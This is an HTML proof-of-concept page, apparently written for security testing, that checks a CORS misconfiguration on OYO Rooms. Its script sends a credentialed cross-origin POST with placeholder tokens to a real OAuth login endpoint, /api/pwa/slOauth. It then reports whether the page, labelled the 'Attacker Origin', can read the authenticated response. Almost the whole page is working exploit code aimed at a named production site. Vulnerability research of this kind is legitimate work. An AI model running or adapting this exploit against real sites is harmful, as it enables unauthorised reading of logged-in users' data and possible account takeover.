<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>OYO CORS Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #111;
            color: #eee;
            padding: 30px;
        }

        button {
            padding: 12px 20px;
            cursor: pointer;
            font-size: 16px;
        }

        pre {
            background: #000;
            padding: 20px;
            margin-top: 20px;
            white-space: pre-wrap;
            word-break: break-word;
        }
    </style>
</head>

<body>

<h2>OYO CORS Verification PoC</h2>

<button onclick="run()">Run Test</button>

<pre id="result">Waiting...</pre>

<script>
async function run() {

    const out = document.getElementById("result");

    out.textContent =
        "Origin: " + window.location.origin + "\n\n" +
        "Testing credentialed cross-origin POST...\n";

    try {

        const response = await fetch(
            "https://www.oyorooms.com/api/pwa/slOauth?locale=en",
            {
                method: "POST",

                credentials: "include",

                headers: {
                    "Content-Type": "text/plain;charset=UTF-8",
                    "Xsrf-Token": "TEST"
                },

                body: JSON.stringify({
                    oauth_token: "TEST",
                    redirect_uri: "https://www.oyorooms.com/login/gmail/",
                    mode: "GMAIL",
                    email: "test@example.com"
                })
            }
        );

        const body = await response.text();

        out.textContent =
            "====================================\n" +
            "CORS ACCEPTED\n" +
            "====================================\n\n" +

            "Attacker Origin:\n" +
            window.location.origin + "\n\n" +

            "HTTP Status:\n" +
            response.status + "\n\n" +

            "JavaScript successfully read the response:\n\n" +
            body;

    } catch (error) {

        out.textContent =
            "====================================\n" +
            "CORS BLOCKED / NOT EXPLOITABLE\n" +
            "====================================\n\n" +

            "Attacker Origin:\n" +
            window.location.origin + "\n\n" +

            "Error:\n" +
            error.name + ": " + error.message + "\n\n" +

            "The browser did not allow JavaScript to complete/read " +
            "the cross-origin POST response.";
    }
}
</script>

</body>
</html>
